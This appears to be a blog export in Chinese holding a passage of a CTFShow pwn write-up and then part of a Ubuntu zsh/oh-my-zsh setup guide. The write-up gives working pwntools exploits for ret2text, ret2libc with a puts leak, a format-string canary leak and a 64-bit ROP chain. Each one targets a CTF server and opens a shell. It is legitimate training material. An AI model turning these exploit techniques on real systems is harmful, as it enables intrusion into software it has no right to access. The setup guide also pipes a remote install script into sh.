<p>IDA分析</p>
<p><img src="https://img-blog.csdnimg.cn/2020100316555337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>发现 bin/sh 地址</p>
<p>可以用 <code>cyclic</code>生成字符串，然后gdb run一下，再计算出偏移</p>
<p><img src="https://img-blog.csdnimg.cn/20201003165929850.png#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/202010031701141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201003170147811.png#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201003170222624.png#pic_center" alt="在这里插入图片描述"></p>
<p><code>cyclic -l 0x......</code></p>
<p><img src="https://img-blog.csdnimg.cn/20201003170357937.png#pic_center" alt="在这里插入图片描述"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28042</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">13</span> + p32(<span class="number">0x8048518</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="3-pwn03"><a href="#3-pwn03" class="headerlink" title="3.pwn03"></a>3.pwn03</h2><h3 id="libc-32"><a href="#libc-32" class="headerlink" title="libc 32"></a>libc 32</h3><p><a href="https://blog.csdn.net/gd_9988/article/details/106744216">参考博客</a></p>
<p>先<code>checksec</code>一下</p>
<p><img src="https://img-blog.csdnimg.cn/20201005131216747.png#pic_center"></p>
<p>32bit 程序<br>IDA分析<br>先看main函数</p>
<p><img src="https://img-blog.csdnimg.cn/20201005131301855.png#pic_center" alt="在这里插入图片描述"></p>
<p>没有什么线索，再进pwnme函数</p>
<p><img src="https://img-blog.csdnimg.cn/20201005131359321.png#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201005131425904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>发现存在一个栈溢出<br>由于找不到system函数的地址，所以</p>
<blockquote>
<p>涉及到plt表和got表<br>程序执行后，plt表里是got表的地址，got表是函数的真实地址<br>程序还未执行时，got表里还是plt表的地址<br>我们需要泄漏got表里的地址，由于开启了ASLR，本地和远程的地址不一样<br>但也只是针对于地址中间位进行随机，最低的12位并不会发生改变<br>也就是我们需要获取到远程环境的函数的真实地址<br>进而判断libc的版本，计算泄漏的函数got表的地址与system的偏移，然后获取到system函数的真实地址，进而计算system函数与/bin/sh的偏移，最终getshell<br>所以我们首先exp的构造<br>首先栈溢出，利用puts函数的plt表的地址，泄漏puts函数的got表中的函数的真实地址,然后返回地址填写main函数重新跳转回来</p>
</blockquote>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28063</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./stack1&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./stack1&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">13</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(get_addr))</span><br></pre></td></tr></table></figure>

<p>输出了puts函数的真实地址<br>ps：这里要remote过去，否则输出的地址会不一样</p>
<p><img src="https://img-blog.csdnimg.cn/20201005133520774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>可以通过后三位判断libc的版本<br><a href="https://libc.blukat.me/">libcSearch</a></p>
<p><img src="https://img-blog.csdnimg.cn/20201005134105795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>知道这些信息之后<br>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28063</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./stack1&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./stack1&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">13</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(get_addr))</span><br><span class="line"></span><br><span class="line">libcbase = get_addr - <span class="number">0x067360</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x03cd10</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x17b8cf</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*<span class="number">13</span>,system_addr,<span class="string">&#x27;AAAA&#x27;</span>,bin_sh])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="4-pwn04"><a href="#4-pwn04" class="headerlink" title="4.pwn04"></a>4.pwn04</h2><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>先checksec</p>
<p><img src="https://img-blog.csdnimg.cn/2020100514433593.png#pic_center" alt="在这里插入图片描述"></p>
<p>栈不可执行<br>Canary打开</p>
<blockquote>
<p>canary:<br>用于防止栈溢出被利用的一种方法，原理是在栈的ebp下面放一个随机数，在函数返回之前会检查这个数有没有被修改，就可以检测是否发生栈溢出。</p>
</blockquote>
<p>main函数：</p>
<p><img src="https://img-blog.csdnimg.cn/20201005144542442.png#pic_center" alt="在这里插入图片描述"></p>
<p>没有线索，跟进vuln函数</p>
<p><img src="https://img-blog.csdnimg.cn/20201005144639881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>看到v3就是canary了<br>也就是下面的 [ebp-0ch]</p>
<p><img src="https://img-blog.csdnimg.cn/20201005145903257.png#pic_center" alt="在这里插入图片描述"></p>
<p>在vuln函数中canary赋值给了eax<br>我们可以通过在这个赋值之后下一个断点，来获取canary的值<br>在此之前我们需要知道printf函数的地址，用来找到canary的偏移<br>所以要先在printf函数下面下一个断点<br><code>b printf</code></p>
<p><img src="https://img-blog.csdnimg.cn/20201005150508325.png#pic_center" alt="在这里插入图片描述"></p>
<p><code>run</code></p>
<p><img src="https://img-blog.csdnimg.cn/20201005152146251.png#pic_center" alt="在这里插入图片描述"></p>
<p>可以看到<br>printf函数的地址是 0xffffd0b0</p>
<p>然后在canary赋值之后下一个断点<br>ps：在vuln函数和main函数中都有canary的赋值</p>
<p><img src="https://img-blog.csdnimg.cn/20201005151100579.png#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201005151126582.png#pic_center" alt="在这里插入图片描述"></p>
<p>这里需要用main函数里面的（我也不知道为什么。。。<br><code>b *0x080486C9</code></p>
<p><img src="https://img-blog.csdnimg.cn/20201005152008443.png#pic_center" alt="在这里插入图片描述"></p>
<p>这样就找到了canary的值<br>之后看printf的地址，找到canary的值，然后算出偏移<br><code>x/40wx 0xffffd0b0</code></p>
<p><img src="https://img-blog.csdnimg.cn/20201005151654295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>发现0x0x1276e500的偏移为31，所以构造canary的值为%31$x<br>canary的值要靠我们的输入buf来赋值，所以要计算一下buf和v3的偏移 = (0x70-0xC) =100</p>
<p><img src="https://img-blog.csdnimg.cn/20201005153200798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>最后还有 (0x8+4) = 12 个字节需要覆盖，覆盖返回地址到system函数才能取得shell</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p =remote(<span class="string">&quot;111.231.70.44&quot;</span>,<span class="number">28017</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">leak_canary = <span class="string">&quot;%31$x&quot;</span></span><br><span class="line">p.sendline(leak_canary)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">getshell = <span class="string">&quot;a&quot;</span> * <span class="number">100</span> + p32(canary) + <span class="string">&quot;b&quot;</span> * <span class="number">12</span> + p32(<span class="number">0x0804859B</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(getshell)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="5-pwn05"><a href="#5-pwn05" class="headerlink" title="5.pwn05"></a>5.pwn05</h2><h3 id="ret2text-32-1"><a href="#ret2text-32-1" class="headerlink" title="ret2text 32"></a>ret2text 32</h3><p>IDA分析一下</p>
<p><img src="https://img-blog.csdnimg.cn/20201005154604507.png#pic_center" alt="在这里插入图片描述"></p>
<p>gets函数 明显的溢出<br>双击s</p>
<p><img src="https://img-blog.csdnimg.cn/20201005154653584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>偏移为 (0x14+4)<br>再 Shift+F12</p>
<p><img src="https://img-blog.csdnimg.cn/20201005154801510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>找到 /bin/sh </p>
<p><img src="https://img-blog.csdnimg.cn/20201005154913771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28024</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">4</span>) + p32(<span class="number">0x08048486</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="6-pwn06"><a href="#6-pwn06" class="headerlink" title="6.pwn06"></a>6.pwn06</h2><h3 id="堆栈平衡-64"><a href="#堆栈平衡-64" class="headerlink" title="堆栈平衡 64"></a>堆栈平衡 64</h3><p>64位的pwn05<br>所以和上一题是差不多的<br>不同的是这里要平衡堆栈</p>
<p><img src="https://img-blog.csdnimg.cn/20201005160148927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>push rbp ：将bp寄存器的值压入栈中<br>然后再看偏移</p>
<p><img src="https://img-blog.csdnimg.cn/20201005160422216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>这里32位是4，而64位则是8</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28070</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">8</span>) + p64(<span class="number">0x400577</span>)+ p64(<span class="number">0x400577</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="7-pwn07"><a href="#7-pwn07" class="headerlink" title="7.pwn07"></a>7.pwn07</h2><h3 id="libc-64"><a href="#libc-64" class="headerlink" title="libc 64"></a>libc 64</h3><p>先checksec一下</p>
<p><img src="https://img-blog.csdnimg.cn/20201012192733970.png#pic_center" alt="在这里插入图片描述"></p>
<p>这题和pwn03差的不多<br>pwn03是32bit的，这题是64bit的<br>64比32需要的payload多了一个pop rdi,ret</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">32</span>位：</span><br><span class="line">payload：<span class="string">&quot;a&quot;</span>*offset + p32(plt) + p32(ret_addr) + p32(got)</span><br><span class="line">getshell: <span class="string">&quot;a&quot;</span>*offset + p32(system_addr) + <span class="string">&quot;AAAA&quot;</span> + p32(str_bin_sh)</span><br><span class="line"><span class="number">64</span>位：</span><br><span class="line">payload：<span class="string">&quot;a&quot;</span>*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr)</span><br><span class="line">getshell: <span class="string">&quot;a&quot;</span>*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh)</span><br></pre></td></tr></table></figure>
<p><code>ROPgadget --binary [file name]</code></p>
<p><img src="https://img-blog.csdnimg.cn/20201012194105578.png#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201012194138780.png#pic_center" alt="在这里插入图片描述"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28049</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  <span class="comment">#产生一个对象</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4006e3</span> <span class="comment"># ROPgadget --binary [file name]</span></span><br><span class="line"></span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]  <span class="comment">#elf.symbols[&#x27;a_function&#x27;]  找到 a_function 的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line"><span class="comment">#64位payload: &quot;a&quot;*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>) <span class="comment">#p.recvuntil(some_string) 接收到 some_string 为止</span></span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment">#p.recvn(N)   接受 N(数字) 字符</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x4006E4</span></span><br><span class="line"></span><br><span class="line">libcbase = puts_addr -  <span class="number">0x0809c0</span>    <span class="comment"># -libc_Offset的puts</span></span><br><span class="line"></span><br><span class="line">system_addr = libcbase + <span class="number">0x04f440</span>   <span class="comment"># +libc_Offset的system</span></span><br><span class="line"></span><br><span class="line">bin_sh = libcbase + <span class="number">0x1b3e9a</span>        <span class="comment"># +libc_Offset的bin/sh</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + ret_addr + pop_rdi + bin_sh + system_addr</span><br><span class="line"><span class="comment">#getshell: b&quot;a&quot;*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="8-栈溢出之ret2text"><a href="#8-栈溢出之ret2text" class="headerlink" title="8.栈溢出之ret2text"></a>8.栈溢出之ret2text</h2><h3 id="ret2text-64"><a href="#ret2text-64" class="headerlink" title="ret2text 64"></a>ret2text 64</h3><p>很简单的一个栈溢出<br>直接IDA分析</p>
<p><img src="/article/CTFShow_0x1/20201012194826370.png" alt="在这里插入图片描述"></p>
<p>从main函数跟进到welcome函数<br>get() 很明显的溢出</p>
<p><img src="/article/CTFShow_0x1/20201012194915979.png" alt="在这里插入图片描述"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>因为是64位的，所以后面要加上8<br>Shift+F12 </p>
<p><img src="/article/CTFShow_0x1/20201012195035341.png" alt="在这里插入图片描述"></p>
<p>发现/bin/sh 果然够简单的。。。<br>双击进去</p>
<p><img src="/article/CTFShow_0x1/20201012195145849.png" alt="在这里插入图片描述"></p>
<p>再双击</p>
<p><img src="/article/CTFShow_0x1/20201012195243513.png" alt="在这里插入图片描述"></p>
<p>找到地址<br>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28072</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>) + p64(<span class="number">0x40063B</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>1</p>
]]></content>
      <categories>
        <category>比赛WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>Ubuntu20_zsh</title>
    <url>/article/Ubuntu20_zsh/</url>
    <content><![CDATA[<h1 id="Ubuntu20下zsh、oh-my-zsh、插件和主题安装"><a href="#Ubuntu20下zsh、oh-my-zsh、插件和主题安装" class="headerlink" title="Ubuntu20下zsh、oh-my-zsh、插件和主题安装"></a>Ubuntu20下zsh、oh-my-zsh、插件和主题安装</h1><p>之前ubuntu16 18都没写过自己安装zsh的过程，借此次ubuntu20顺手写一下</p>
<span id="more"></span>

<h2 id="检查当前可用的shell："><a href="#检查当前可用的shell：" class="headerlink" title="检查当前可用的shell："></a>检查当前可用的shell：</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cat /etc/shells</span><br></pre></td></tr></table></figure>

<h2 id="查看当前使用的shell："><a href="#查看当前使用的shell：" class="headerlink" title="查看当前使用的shell："></a>查看当前使用的shell：</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$SHELL</span></span><br></pre></td></tr></table></figure>

<h2 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install zsh -y</span><br></pre></td></tr></table></figure>

<h2 id="把默认的Shell改成zsh"><a href="#把默认的Shell改成zsh" class="headerlink" title="把默认的Shell改成zsh"></a>把默认的Shell改成zsh</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>

<p>注意：不要使用sudo</p>
<h2 id="配置密码文件，解决chsh-PAM认证失败的问题"><a href="#配置密码文件，解决chsh-PAM认证失败的问题" class="headerlink" title="配置密码文件，解决chsh: PAM认证失败的问题"></a>配置密码文件，解决chsh: PAM认证失败的问题</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/article/Ubuntu20_zsh/image-20210724130411040.png" alt="image-20210724130411041"></p>
<h2 id="安装-curl-已有则跳过"><a href="#安装-curl-已有则跳过" class="headerlink" title="安装 curl (已有则跳过)"></a>安装 curl (已有则跳过)</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install curl</span><br></pre></td></tr></table></figure>

<h2 id="安装oh-my-zsh"><a href="#安装oh-my-zsh" class="headerlink" title="安装oh-my-zsh"></a>安装oh-my-zsh</h2><p>curl：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://gitee.com/shmhlsy/oh-my-zsh-install.sh/raw/master/install.sh)</span>&quot;</span> -y</span><br></pre></td></tr></table></figure>

<p>或者</p>
<p>wget：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(wget -O- https://gitee.com/shmhlsy/oh-my-zsh-install.sh/raw/master/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/Ubuntu20_zsh/image-20210724130842599.png" alt="image-20210724130842599"></p>
<h2 id="下载-zsh-syntax-highlighting-语法高亮插件"><a href="#下载-zsh-syntax-highlighting-语法高亮插件" class="headerlink" title="下载 zsh-syntax-highlighting 语法高亮插件"></a>下载 zsh-syntax-highlighting 语法高亮插件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>

<h2 id="下载-zsh-autosuggestions-自动提示插件"><a href="#下载-zsh-autosuggestions-自动提示插件" class="headerlink" title="下载 zsh-autosuggestions 自动提示插件"></a>下载 zsh-autosuggestions 自动提示插件</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>

<h2 id="配置生效"><a href="#配置生效" class="headerlink" title="配置生效"></a>配置生效</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>

<h2 id="配置-zshrc文件"><a href="#配置-zshrc文件" class="headerlink" title="配置.zshrc文件"></a>配置.zshrc文件</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure>

<blockquote>
<p>plugins=(git zsh-syntax-highlighting zsh-autosuggestions)</p>
</blockquote>
<h1 id="安装-agnoster-主题"><a href="#安装-agnoster-主题" class="headerlink" title="安装 agnoster 主题"></a>安装 agnoster 主题</h1><h2 id="下载pip"><a href="#下载pip" class="headerlink" title="下载pip"></a>下载pip</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python3-pip -y</span><br></pre></td></tr></table></figure>

<p>pip升级（可以不做）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo pip3 install --upgrade pip</span><br></pre></td></tr></table></figure>

<h2 id="下载powerline"><a href="#下载powerline" class="headerlink" title="下载powerline"></a>下载powerline</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip install powerline-status --user</span><br></pre></td></tr></table></figure>

<h2 id="安装PowerFonts"><a href="#安装PowerFonts" class="headerlink" title="安装PowerFonts"></a>安装PowerFonts</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/powerline/fonts.git --depth=1</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> fonts</span><br><span class="line"></span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">➜  fonts git:(master) ./install.sh</span><br><span class="line">Copying fonts...</span><br><span class="line">Powerline fonts installed to /root/.<span class="built_in">local</span>/share/fonts</span><br></pre></td></tr></table></figure>

<h2 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h2><p>记得返回目录，别在上面font目录下下载，虽然影响不大</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/fcamblor/oh-my-zsh-agnoster-fcamblor.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> oh-my-zsh-agnoster-fcamblor/</span><br><span class="line"></span><br><span class="line">./install</span><br></pre></td></tr></table></figure>

<h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim ~/.zshrc</span><br><span class="line"></span><br><span class="line">ZSH_THEME=<span class="string">&quot;agnoster&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="配置生效-1"><a href="#配置生效-1" class="headerlink" title="配置生效"></a>配置生效</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>

<p>最后若是字体没有生效导致有乱码</p>
<ul>
<li><p>打开新的 Terminal 看是否生效</p>
</li>
<li><p>执行</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install fonts-powerline</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="/article/Ubuntu20_zsh/image-20210724161512808.png" alt="image-20210724161512808"></p>
<h1 id="git-clone-加速"><a href="#git-clone-加速" class="headerlink" title="git clone 加速"></a>git clone 加速</h1><p>github.com 换为 </p>
<p>github.com.cnpmjs.org</p>
<h1 id="修改主机名"><a href="#修改主机名" class="headerlink" title="修改主机名"></a>修改主机名</h1><h2 id="查看主机名"><a href="#查看主机名" class="headerlink" title="查看主机名"></a>查看主机名</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>

